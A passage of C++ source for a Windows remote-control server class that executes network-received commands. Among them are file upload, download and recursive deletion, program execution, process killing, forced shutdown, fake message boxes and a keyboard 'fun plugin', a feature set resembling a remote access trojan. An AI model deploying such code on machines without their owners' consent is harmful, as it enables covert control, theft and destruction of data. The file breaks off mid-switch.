
#include <Tlhelp32.h>
#include <Shellapi.h>
#include <Lmcons.h>

DWORD WINAPI DeleteFilesProc(LPVOID RootName);

class CCommandMonitorServer:public CCommandMonitorUtility,public INetworkByteStream
{
	protected:

		bool GETLogicalDrives(void);
		bool GETSubDirs(void);
		bool GETSubDirNames(void);
		bool GETDriveType(void);
		bool GETDriveInfo(void);
		bool GETExeInfo(void);
		bool DefaultMessage(void);
		bool DisplayMessage(void);
		bool MsgSetCompression(void);
		bool DownLoadFile(void);
		bool GetServerName(void);
		bool GetMainMemory(void);
		bool GetCompUser(void);
		bool GetOsVersion(void);
		bool GetProcessModule(DWORD dwPID,DWORD dwModuleID,LPMODULEENTRY32 lpMe32,DWORD cbMe32); 
		bool GETProcessList(void);
		bool KillProcess(void);
		bool SetPriority(void);
		bool ExecuteProgram(void);
		bool WindowsNTEnableShutdown(void);
		bool ShutDownOrLogOffSystem(UINT uFlagValue=EWX_SHUTDOWN);
		bool LogOffSystem(void);
		bool ShutDownSystem(void); 
		bool PowerOffSystem(void);
		bool RestartSystem(void);
		bool DeleteFileFunc(void);
		bool CreateFolderFunc(void);
		bool SaveUpLoadedFile(void);
		bool ListenPort(void);
		bool InstallKeyBrdFunPlugin(void);
		bool UnInstallKeyBrdFunPlugin(void);
		UINT GetOSID(void);
		bool OpenOrCloseCDRom(bool IsOpen=true);

	public:
   
	  ~CCommandMonitorServer();
	   CCommandMonitorServer(UINT32 CommandType=COMMAND_MONITOR_NULL_COMMAND,TCHAR *CommandArgs=0,UINT32 Compression=COMMAND_MONITOR_COMPRESS_NIL,TCHAR ResultSeperator=_T('\n'));	
	   
	   bool ExecuteCommand(void);
       UINT32 WriteToNetworkByteStream(BYTE* &OutByteStream);
	   UINT32 ReadFromNetworkByteStream(BYTE *InByteStream);
};

UINT CCommandMonitorServer::GetOSID(void)
{
	OSVERSIONINFO VerInfo;
	VerInfo.dwOSVersionInfoSize = sizeof(VerInfo);
	return (GetVersionEx(&VerInfo)) ? VerInfo.dwPlatformId : 0;
}

bool CCommandMonitorServer::WindowsNTEnableShutdown(void)
{
	DWORD			 TpOld;
	LUID			 TempLuid;
	HANDLE			 CurProcHandle,AccTokenHandle;
    TOKEN_PRIVILEGES TempTP,TempTPOld;
    
	if (LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &TempLuid))
		if (CurProcHandle =GetCurrentProcess(),CurProcHandle)
			if (OpenProcessToken(CurProcHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &AccTokenHandle) )
			{
				TempTP.PrivilegeCount = 1; TempTP.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
				TempTP.Privileges->Luid.HighPart = TempLuid.HighPart; TempTP.Privileges->Luid.LowPart = TempLuid.LowPart;
				if (AdjustTokenPrivileges(AccTokenHandle,0,&TempTP,sizeof(TempTP),&TempTPOld,&TpOld) && ::CloseHandle(AccTokenHandle))
					return true;
				else return false;
			}
	return false;
}

bool CCommandMonitorServer::ShutDownOrLogOffSystem(UINT uFlagValue)
{
	if (GetOSID()==VER_PLATFORM_WIN32_NT)
		if (!WindowsNTEnableShutdown()) return false;

	if(!m_tchrCommandArguments||((*((BYTE*)m_tchrCommandArguments))==COMMAND_MONITOR_SYSTEM_DOWN_NORMAL))
		return (ExitWindowsEx(uFlagValue,0xFFFFFFFF));
	else
		return (ExitWindowsEx(uFlagValue | EWX_FORCE,0xFFFFFFFF));
}

bool CCommandMonitorServer::PowerOffSystem(void)
{
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	try
	{
		if(ShutDownOrLogOffSystem(EWX_POWEROFF)) return true;
	}
	catch(...) {}
	return DefaultMessage();
}

bool CCommandMonitorServer::RestartSystem(void)
{
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	try
	{
		if(ShutDownOrLogOffSystem(EWX_REBOOT)) return true;
	}
	catch(...) {}
	return DefaultMessage();
}

bool CCommandMonitorServer::LogOffSystem(void)
{
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	try
	{
		if(ShutDownOrLogOffSystem(EWX_LOGOFF)) return true;
	}
	catch(...) {}
	return DefaultMessage();
}

bool CCommandMonitorServer::ShutDownSystem(void) 
{
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	try
	{
		if(ShutDownOrLogOffSystem(EWX_SHUTDOWN)) return true;
	}
	catch(...) {}
	return DefaultMessage();
}

bool CCommandMonitorServer::GetOsVersion(void)
{
	OSVERSIONINFOEX OsInfo;
	if(OsInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX),!GetVersionEx((OSVERSIONINFO*)&OsInfo)) 
		if(OsInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO),!GetVersionEx((OSVERSIONINFO*)&OsInfo))
			return DefaultMessage();
	
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	m_ulngResultLength=0;
	if(!AllocateMem((void**)&m_tchrCommandResult,sizeof(OSVERSIONINFOEX))) return DefaultMessage();
	CopyBytes(m_tchrCommandResult,(BYTE*)&OsInfo,(m_ulngResultLength=sizeof(OSVERSIONINFOEX))); 
	return true;
}

bool CCommandMonitorServer::GetMainMemory(void)
{
	MEMORYSTATUS MainMemStat;
	ZeroMemory((void*)&MainMemStat,sizeof(MEMORYSTATUS)); 
	MainMemStat.dwLength=sizeof(MEMORYSTATUS); 
    GlobalMemoryStatus(&MainMemStat);
    try
	{
		CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
		m_ulngResultLength=0;
		if(!AllocateMem((void**)&m_tchrCommandResult,sizeof(MEMORYSTATUS))) return DefaultMessage();
		CopyBytes(m_tchrCommandResult,(BYTE*)&MainMemStat,(m_ulngResultLength=sizeof(MEMORYSTATUS))); 
		return true;
	}catch(...) { return DefaultMessage(); }
}


bool CCommandMonitorServer::ExecuteProgram(void)
{	
	if(!m_tchrCommandArguments) return DefaultMessage();
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	m_ulngResultLength=0;
	try
	{
		TCHAR *ExeName=0,*CmdLine=0;
		if(!CGeneralMemoryUtility::GetToken((TCHAR*)m_tchrCommandArguments,_T("\n"),&ExeName,&CmdLine)) return DefaultMessage(); 
		HINSTANCE hinst=ShellExecute(0,(LPCSTR)(_T("open")),(LPCSTR)ExeName,(LPCSTR)CmdLine,0,SW_MAXIMIZE);
		CGeneralMemoryUtility::DeleteAll((void**)&ExeName);CGeneralMemoryUtility::DeleteAll((void**)&CmdLine);
		if(((int)hinst)>32) return true;
		else return DefaultMessage();
	}
	catch(...) { return DefaultMessage(); }
}


bool CCommandMonitorServer::KillProcess(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	try
	{
		DWORD dwdProcessID=*((DWORD*)m_tchrCommandArguments);
		HANDLE HProcess=OpenProcess(PROCESS_ALL_ACCESS,true,dwdProcessID);
		if(!HProcess) return DefaultMessage();
		if(!TerminateProcess(HProcess,0)) return DefaultMessage();
		else
		{
			CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
			m_ulngResultLength=0;
			return true;
		}
	}
	catch(...) { return DefaultMessage(); }
}

bool CCommandMonitorServer::SetPriority(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	try
	{
		DWORD dwdProcessID=*((DWORD*)m_tchrCommandArguments);
		HANDLE HProcess=OpenProcess(PROCESS_ALL_ACCESS,true,dwdProcessID);
		if(!HProcess) return DefaultMessage();
		BYTE bytPrior=*((BYTE*)(m_tchrCommandArguments+sizeof(DWORD)));
		DWORD dwdPriority;
		switch(bytPrior)
		{
			case COMMAND_MONITOR_PROCESS_PRIORITY_ABOVE_NORMAL:
				dwdPriority=/*ABOVE_NORMAL_PRIORITY_CLASS*/HIGH_PRIORITY_CLASS; break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_BELOW_NORMAL:
				dwdPriority=/*BELOW_NORMAL_PRIORITY_CLASS*/IDLE_PRIORITY_CLASS; break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_HIGH_PRIORITY:
				dwdPriority=HIGH_PRIORITY_CLASS;break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_IDLE_PRIORITY:
				dwdPriority=IDLE_PRIORITY_CLASS;break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_NORMAL_PRIORITY:
				dwdPriority=NORMAL_PRIORITY_CLASS;break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_REALTIME_PRIORITY:
				dwdPriority=REALTIME_PRIORITY_CLASS;break;
			case COMMAND_MONITOR_PROCESS_PRIORITY_NO_CHANGE: return true;
			default: return DefaultMessage();
		}
		if(!SetPriorityClass(HProcess,dwdPriority)) return DefaultMessage();
		else
		{
			CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
			m_ulngResultLength=0;
			return true;
		}
	}
	catch(...) { return DefaultMessage(); }
}

bool CCommandMonitorServer::GetProcessModule(DWORD dwPID, DWORD dwModuleID,LPMODULEENTRY32 lpMe32, DWORD cbMe32) 
{ 
    bool          bRet        = false;
    bool          bFound      = false; 
    HANDLE        hModuleSnap = 0;
    MODULEENTRY32 me32        = {0}; 
 
    hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); 
    if (hModuleSnap == INVALID_HANDLE_VALUE) 
        return false; 
 
    me32.dwSize = sizeof(MODULEENTRY32); 
 
    if (Module32First(hModuleSnap, &me32)) 
    { 
        do 
        { 
            if (me32.th32ModuleID == dwModuleID) 
            { 
                CopyMemory (lpMe32, &me32, cbMe32); 
                bFound = true; 
            } 
        } 
        while (!bFound && Module32Next(hModuleSnap, &me32)); 
 
        bRet = bFound;   
                         
    } 
    else 
       bRet = false;    
 
    CloseHandle (hModuleSnap); 
 
    return (bRet); 
} 

bool  CCommandMonitorServer::GETProcessList(void)
{
	HANDLE         hProcessSnap = NULL; 
    bool           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 

	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	m_ulngResultLength=0;
	
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    if (hProcessSnap == INVALID_HANDLE_VALUE) return DefaultMessage();
	pe32.dwSize = sizeof(PROCESSENTRY32); 

	if (Process32First(hProcessSnap, &pe32)) 
    { 
        DWORD         dwPriorityClass; 
        BOOL          bGotModule = FALSE; 
        MODULEENTRY32 me32       = {0}; 

	
        do 
        { 
            bGotModule = GetProcessModule(pe32.th32ProcessID,pe32.th32ModuleID, &me32, sizeof(MODULEENTRY32)); 

            TCHAR tchrModuleName[257];
		  
			_tcscpy(tchrModuleName,bGotModule?me32.szModule:_T("Unknown")); 
            
            HANDLE hProcess; 

            hProcess = OpenProcess (PROCESS_ALL_ACCESS,false,pe32.th32ProcessID); 
            dwPriorityClass = GetPriorityClass (hProcess); 
            CloseHandle (hProcess); 

			TCHAR tchrInfo[1000];
			UINT32 uintCurPos=m_ulngResultLength;
			m_ulngResultLength+=_stprintf(tchrInfo,"%s|%s|%d|%d|%d\n",pe32.szExeFile,tchrModuleName,pe32.th32ProcessID,pe32.pcPriClassBase,pe32.cntThreads);
			if((m_tchrCommandResult=(BYTE*)ReAllocateMemory((void*)m_tchrCommandResult,sizeof(TCHAR)*(m_ulngResultLength+1)))==0)  
			{
				CloseHandle (hProcessSnap); 
				return DefaultMessage();
			}
			if(uintCurPos) _tcscat((TCHAR*)(m_tchrCommandResult+sizeof(TCHAR)*uintCurPos),tchrInfo);
			else _tcscpy((TCHAR*)m_tchrCommandResult,tchrInfo);
        } 
        while (Process32Next(hProcessSnap, &pe32)); 
        bRet = true; 
    } 
    else 
        bRet = false;    
 
    CloseHandle (hProcessSnap); 
    if(!bRet) return DefaultMessage(); else return true;
}

bool CCommandMonitorServer::GETSubDirNames(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	WIN32_FIND_DATA FileData;
	HANDLE hFile=FindFirstFile((LPCSTR)m_tchrCommandArguments,&FileData);
	if(hFile==INVALID_HANDLE_VALUE) return DefaultMessage();
	long lngCount=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	m_ulngResultLength=0;
	try
	{
		TCHAR tchrType[2];
		do
		{
			if( !_tcscmp((TCHAR*)FileData.cFileName,_T(".") ) || 
				!_tcscmp((TCHAR*)FileData.cFileName,_T("..")) ||
				 _tcslen((TCHAR*)FileData.cFileName)>=50    ) continue;

			_tcscpy(tchrType,_T((FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)?"1":"0"));

			if(!lngCount) 
				if(!AllocateMem((void**)&m_tchrCommandResult,lngCount=(sizeof(TCHAR)*(_tcslen(FileData.cFileName)+3)))) 
					throw MADE_ERROR;
				else 
					_tcscat(_tcscat(_tcscpy((TCHAR*)m_tchrCommandResult,(TCHAR*)FileData.cFileName),tchrType),_T("\n"));
			else 
			{	
				m_tchrCommandResult=(BYTE*)ReAllocateMemory(m_tchrCommandResult,lngCount+=sizeof(TCHAR)*(_tcslen(FileData.cFileName)+3));
				_tcscat(_tcscat(_tcscat((TCHAR*)m_tchrCommandResult,(TCHAR*)FileData.cFileName),tchrType),_T("\n"));
			}
		}
		while(FindNextFile(hFile,&FileData)); 
		FindClose(hFile);
	}
	catch(...) 
	{ 	
		if(lngCount<=1)
		{
			FindClose(hFile);
			CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
			return DefaultMessage();
		}
	}
	if(lngCount<=1) return DefaultMessage();

	((TCHAR*)m_tchrCommandResult)[lngCount-2]='\0';
	m_ulngResultLength=lngCount;
	return true;
}

DWORD WINAPI DeleteFilesProc(LPVOID RootName)
{
	TCHAR tchrRoot[900],Tmp[1000];

	try
	{
		_tcscat(_tcscpy(Tmp,_tcscpy(tchrRoot,(TCHAR*)RootName)),_T("\\*"));
		while(tchrRoot[_tcslen(tchrRoot)-1]=='\\') tchrRoot[_tcslen(tchrRoot)-1]='\0';
	}
	catch(...) { return -1; }

	WIN32_FIND_DATA FileData;
		
	UINT uintPrevMode=SetErrorMode(SEM_FAILCRITICALERRORS);

	HANDLE hFile=FindFirstFile((LPCSTR)Tmp,&FileData);  

	if(hFile==INVALID_HANDLE_VALUE) 
	{
		try
		{
			if((hFile=FindFirstFile((LPCSTR)tchrRoot,&FileData))!=INVALID_HANDLE_VALUE)
				if(FindClose(hFile),FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					RemoveDirectory(tchrRoot);
				else 
					DeleteFile(tchrRoot);
		}
		catch(...) {}
		
		SetErrorMode(uintPrevMode);
		return 0;
	}
	try
	{
		do
		{	
			try
			{
				if( !_tcscmp((TCHAR*)FileData.cFileName,_T(".") ) || 
				    !_tcscmp((TCHAR*)FileData.cFileName,_T("..")) ||
				     _tcslen((TCHAR*)FileData.cFileName)>=50    ) continue;
				 
				if(_tcscat(_tcscat(_tcscpy(Tmp,tchrRoot),"//"),FileData.cFileName),
					FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
						DeleteFilesProc((LPVOID)Tmp);
				else DeleteFile(Tmp);
			}
			catch(...) {}
		}
		while(FindNextFile(hFile,&FileData)); 
		FindClose(hFile);
	}
	catch(...) {}
	try { RemoveDirectory(tchrRoot); } catch(...) {}
	SetErrorMode(uintPrevMode);
	return 0;
}

bool CCommandMonitorServer::DeleteFileFunc(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	HANDLE ThrdDeleteThrd=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&DeleteFilesProc,(LPVOID)m_tchrCommandArguments,CREATE_SUSPENDED,NULL);
	if(!ThrdDeleteThrd) return DefaultMessage();
	ResumeThread(ThrdDeleteThrd);
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	return true;
}

bool CCommandMonitorServer::CreateFolderFunc(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	bool blnOk=true;
	if(!CreatePathFromRoot((TCHAR*)m_tchrCommandArguments)) blnOk=false;
	if(!blnOk) return DefaultMessage();
	m_ulngResultLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	return true;
}

bool CCommandMonitorServer::GETSubDirs(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	WIN32_FIND_DATA FileData;
		
	UINT uintPrevMode=SetErrorMode(SEM_FAILCRITICALERRORS);
	HANDLE hFile=FindFirstFile((LPCSTR)m_tchrCommandArguments,&FileData);  

	if(hFile==INVALID_HANDLE_VALUE) 
	{
		SetErrorMode(uintPrevMode);
		return DefaultMessage();
	}

	long lngCount=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
	m_ulngResultLength=0;
	try
	{
		do
		{	
			if( !_tcscmp((TCHAR*)FileData.cFileName,_T(".") ) || 
				!_tcscmp((TCHAR*)FileData.cFileName,_T("..")) ||
				 _tcslen((TCHAR*)FileData.cFileName)>=50    ) continue;

			m_tchrCommandResult=(BYTE*)ReAllocateMemory((void*)m_tchrCommandResult,++lngCount*sizeof(WIN32_FIND_DATA)); 
			if(!m_tchrCommandResult) return DefaultMessage();
			(((WIN32_FIND_DATA*)m_tchrCommandResult)[lngCount-1])=FileData;	
		}
		while(FindNextFile(hFile,&FileData)); 
		FindClose(hFile);
		SetErrorMode(uintPrevMode);
	}
	catch(...) 
	{ 
		if(SetErrorMode(uintPrevMode),lngCount<=1)
		{
			FindClose(hFile);
			CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult); 
			return DefaultMessage();
		}
	}
	if(lngCount<=0) return DefaultMessage();

	m_ulngResultLength=lngCount*sizeof(WIN32_FIND_DATA);
	return true;
}

bool CCommandMonitorServer::GetCompUser(void)
{
	m_ulngResultLength=0;
	DWORD len1=MAX_COMPUTERNAME_LENGTH,len2=UNLEN;
	TCHAR CompNam[MAX_COMPUTERNAME_LENGTH + 1],UserNam[UNLEN + 1];
	if(!GetComputerName((LPTSTR)CompNam,&len1)) return DefaultMessage();
	if(!GetUserName((LPTSTR)UserNam,&len2))return DefaultMessage();
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
	UINT32 uintLen=len1+sizeof(TCHAR)+len2+sizeof(TCHAR);
	if(!AllocateMem((void**)&m_tchrCommandResult,sizeof(BYTE)*uintLen)) return DefaultMessage();
	_stprintf((TCHAR*)m_tchrCommandResult,"%s%c%s",CompNam,m_tchrTokenSeperator,UserNam);   
	m_ulngResultLength=uintLen;
	return true;
}

bool CCommandMonitorServer::GETLogicalDrives(void)
{
	m_ulngResultLength=0;
	TCHAR *tchrBuff=0;
	if(!AllocateMem((void**)&tchrBuff,sizeof(TCHAR)*2000)) return DefaultMessage();
	DWORD dwLen=GetLogicalDriveStrings(2000,tchrBuff);   
	if(dwLen>2000 || !AllocateMem((TCHAR**)&m_tchrCommandResult,tchrBuff,dwLen) ||
	   !ReplaceChar((TCHAR*)m_tchrCommandResult,dwLen,_T('\0'),m_tchrTokenSeperator))
	{ 
		try { CGeneralMemoryUtility::DeleteAll((void**)&tchrBuff); } catch(...){}
		return DefaultMessage(); 
	}
	try { CGeneralMemoryUtility::DeleteAll((void**)&tchrBuff); } catch(...){}
	m_ulngResultLength=dwLen;
	return true;
}

bool CCommandMonitorServer::GETDriveType(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	try
	{
		m_ulngResultLength=0;
		UINT DrvType=GetDriveType((LPCSTR)m_tchrCommandArguments);  
		CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
		if(!AllocateMem((void**)&m_tchrCommandResult,sizeof(BYTE))) return DefaultMessage();
		m_ulngResultLength=1;
		switch(DrvType)
		{
			case DRIVE_NO_ROOT_DIR:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_UNKNOWN; return true;
			case DRIVE_REMOVABLE:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_REMOVABLE; return true;
			case DRIVE_FIXED:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_FIXED; return true;
			case DRIVE_CDROM:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_CDROM; return true;
			case DRIVE_RAMDISK:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_RAMDISK; return true;
			case DRIVE_REMOTE:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_REMOTE; return true;
			default /*DRIVE_UNKNOWN*/:*m_tchrCommandResult=COMMAND_MONITOR_DRIVE_UNKNOWN; return true; 
		}
	}
	catch(...) { return DefaultMessage(); }
}


bool CCommandMonitorServer::GETDriveInfo(void)
{
if(!m_tchrCommandArguments ) return DefaultMessage();

UINT uintPrevMode=SetErrorMode(SEM_FAILCRITICALERRORS);

__int64  i64FreeBytesToCaller,i64TotalBytes,i64FreeBytes;
DWORD dwSectPerClust,dwBytesPerSect,dwFreeClusters,dwTotalClusters;
bool  fResult,flg1=false,flg2=false;
TCHAR tchrBuff1[3000]=_T(""),tchrBuff2[1500]=_T("");
ULONG ulng1,ulng2;

float flt1,flt2,flt3;

m_ulngResultLength=0;
try
{   
   fResult = GetDiskFreeSpaceEx((LPCSTR)m_tchrCommandArguments ,(PULARGE_INTEGER)&i64FreeBytesToCaller,(PULARGE_INTEGER)&i64TotalBytes,(PULARGE_INTEGER)&i64FreeBytes);
   if(fResult)
	   flt1=(float)i64FreeBytesToCaller/(1024.0*1024.0),flt2=(float)i64TotalBytes/(1024.0*1024.0),flt3=(float)i64FreeBytes/(1024.0*1024.0),
		m_ulngResultLength+=ulng1=_stprintf(tchrBuff1,"Free Mega Bytes For User:%f%cTotal Mega Bytes On Drive:%f%cTotal Free Mega Bytes:%f%c",
		flt1,m_tchrTokenSeperator,flt2,m_tchrTokenSeperator,flt3,m_tchrTokenSeperator),flg1=true; 
}
catch(...) {}

try
{
   fResult = GetDiskFreeSpace((LPCSTR)m_tchrCommandArguments ,&dwSectPerClust,&dwBytesPerSect,&dwFreeClusters,&dwTotalClusters);
   if(fResult)
	   m_ulngResultLength+=ulng2=_stprintf(tchrBuff2,"\nSectors Per Cluster:%d%cBytes Per Sector:%d%cFree Clusters:%d%cTotal Clusters:%d%c",
       dwSectPerClust,m_tchrTokenSeperator,dwBytesPerSect,m_tchrTokenSeperator,dwFreeClusters,m_tchrTokenSeperator,
	   dwTotalClusters,m_tchrTokenSeperator),flg2=true;
}
catch(...) {}

SetErrorMode(uintPrevMode);

if(!flg1&&!flg2) return DefaultMessage();
_tcscat(tchrBuff1,tchrBuff2);
AllocateMem((TCHAR**)&m_tchrCommandResult,tchrBuff1,m_ulngResultLength); 
return true;
}

bool CCommandMonitorServer::GETExeInfo(void)
{
	if(!m_tchrCommandArguments ) return DefaultMessage();
	DWORD exeType;
	try
	{
		CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
		if(!AllocateMem((void**)&m_tchrCommandResult,sizeof(BYTE))) return DefaultMessage();
		m_ulngResultLength=1;
		if(m_ulngResultLength=0,!GetBinaryType((LPCSTR)m_tchrCommandArguments,&exeType))
		{
			m_tchrCommandResult=COMMAND_MONITOR_EXE_UNKNOWN;return true;
		}
		switch(exeType)
		{
			case SCS_32BIT_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_UNKNOWN;return true;
			case /*SCS_64BIT_BINARY*/6:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_64BIT_BINARY;;return true;
			case SCS_DOS_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_DOS_BINARY;return true;
			case SCS_OS216_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_OS216_BINARY;return true;
			case SCS_PIF_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_PIF_BINARY;return true;
			case SCS_POSIX_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_POSIX_BINARY;return true;
			case SCS_WOW_BINARY:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_WOW_BINARY;return true;
			default:
				*m_tchrCommandResult=COMMAND_MONITOR_EXE_UNKNOWN;return true;
		}
	}
	catch(...) { return DefaultMessage(); }
}

bool CCommandMonitorServer::ListenPort(void)
{
	TCHAR strPort[10];
	m_ulngResultLength=_stprintf(strPort,"%ld",gbl_struct_WinMonitorServerConfig.SNetworkConnection.lngListenPort);
	if(!CopyBytes((BYTE**)&m_tchrCommandResult,(BYTE*)strPort,m_ulngResultLength)) 
		return DefaultMessage();   
	
	return true;
}

bool CCommandMonitorServer::GetServerName(void)
{
	if(m_ulngResultLength=0,!AllocateMem((TCHAR**)&m_tchrCommandResult,gbl_struct_WinMonitorServerConfig.SGeneral.tchrInternalName)) return DefaultMessage();  
	else 
	{
		m_ulngResultLength=(UINT32)_tcslen((TCHAR*)m_tchrCommandResult);
		return true;
	}
}

bool CCommandMonitorServer::OpenOrCloseCDRom(bool IsOpen)
{
	CFunPlugin FunPlugin;
	if(IsOpen) return  FunPlugin.OpenCDRom();
	else       return  FunPlugin.CloseCDRom(); 
}

bool CCommandMonitorServer::UnInstallKeyBrdFunPlugin(void)
{
	CFunPlugin FunPlugin;
	if(FunPlugin.StopKeyBoardFunPlugin()) return true; 
	return DefaultMessage();
}

bool CCommandMonitorServer::InstallKeyBrdFunPlugin(void)
{
	CFunPlugin FunPlugin;
	if(FunPlugin.StartKeyBoardFunPlugin()) return true; 
	return DefaultMessage();
}


bool CCommandMonitorServer::DefaultMessage(void)
{
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_NULL_COMMAND,m_uint32TypeAndCompression);
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);m_ulngResultLength=0;
	return true;
}

bool CCommandMonitorServer::DisplayMessage(void)
{
	if(!m_tchrCommandArguments ) return DefaultMessage();
	try
	{
		FakeMessageHeader Header=*((FakeMessageHeader*)m_tchrCommandArguments);
		TCHAR *msgText=0,*msgCap=0;
		if(!AllocateMem(&msgText,(TCHAR*)(m_tchrCommandArguments+sizeof(FakeMessageHeader)),
			         (Header.byt_TextLen)*sizeof(TCHAR),true)) msgText=_T("");
		if(!AllocateMem(&msgCap,(TCHAR*)(m_tchrCommandArguments+sizeof(FakeMessageHeader)+(Header.byt_TextLen)*sizeof(TCHAR)),
			         (Header.byt_Captionlen)*sizeof(TCHAR),true)) msgCap=_T("");
	
		
		int WinMsgType;
		switch(Header.byt_MsgType)
		{
			case COMMAND_MONITOR_MSG_INFO: WinMsgType=MB_ICONINFORMATION;break; 
			case COMMAND_MONITOR_MSG_STOP: WinMsgType=MB_ICONSTOP;break; 
			case COMMAND_MONITOR_MSG_QSTN: WinMsgType=MB_ICONQUESTION;break;
			default /*COMMAND_MONITOR_MSG_EXCL*/: WinMsgType=MB_ICONEXCLAMATION;break; 
		}
		MessageBox(0,(LPCSTR)msgText,(LPCSTR)msgCap,WinMsgType);
		CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
		CGeneralMemoryUtility::DeleteAll((void**)msgText);
		CGeneralMemoryUtility::DeleteAll((void**)msgCap);
		m_ulngResultLength=0;
		return true;
	}catch(...) { return DefaultMessage(); }
}

bool CCommandMonitorServer::MsgSetCompression(void)
{
	COMMAND_MONITOR_SetCompression(*((UINT32*)m_tchrCommandArguments),m_uint32TypeAndCompression);
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);m_ulngResultLength=0;
	return true;
}

bool CCommandMonitorServer::SaveUpLoadedFile(void)
{
	if(!m_tchrCommandArguments) return DefaultMessage();
	FileUpLoadHeader Header;
	Header=*((FileUpLoadHeader*)m_tchrCommandArguments);
	TCHAR *PathToSave=(TCHAR*)((BYTE*)m_tchrCommandArguments+sizeof(FileUpLoadHeader));
	if(!SaveFileToDisk(PathToSave,(BYTE*)m_tchrCommandArguments+sizeof(FileUpLoadHeader)+Header.uint16PathLength,m_ulngCommandArgLength-(sizeof(FileUpLoadHeader)+Header.uint16PathLength)))
		return DefaultMessage();
	
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);m_ulngResultLength=0;
	return true;
}

bool CCommandMonitorServer::DownLoadFile(void)
{
	if(LoadFileFromDisk((TCHAR*)m_tchrCommandArguments,(void**)&m_tchrCommandResult,m_ulngResultLength,0)) 
		return true;
	else 
		return DefaultMessage();
}

bool CCommandMonitorServer::ExecuteCommand(void)
{
	switch(COMMAND_MONITOR_GetType(m_uint32TypeAndCompression))
	{
		case COMMAND_MONITOR_GET_LOGICAL_DRIVES: return GETLogicalDrives();
		case COMMAND_MONITOR_GET_SUB_DIRS      : return GETSubDirs();
		case COMMAND_MONITOR_GET_DRIVE_TYPE    : return GETDriveType();
		case COMMAND_MONITOR_GET_DRIVE_INFO    : return GETDriveInfo(); 
		case COMMAND_MONITOR_GET_FILE_ASEXE    : return GETExeInfo();
		case COMMAND_MONITOR_DISPLAY_MSG       : return DisplayMessage();
		case COMMAND_MONITOR_SET_COMPRESSION   : return MsgSetCompression();  
		case COMMAND_MONITOR_DOWNLOAD_FILE     : return DownLoadFile();
		case COMMAND_MONITOR_GET_WINSERVER_NAME: return GetServerName();
		case COMMAND_MONITOR_GET_MAIN_MEMORY   : return GetMainMemory();
		case COMMAND_MONITOR_GET_COMPUSER_NAME : return GetCompUser(); 
		case COMMAND_MONITOR_GET_OS_VERSION    : return GetOsVersion();
		case COMMAND_MONITOR_GET_SUB_DIR_NAMES : return GETSubDirNames();
		case COMMAND_MONITOR_GET_PROCESSLIST   : return GETProcessList();
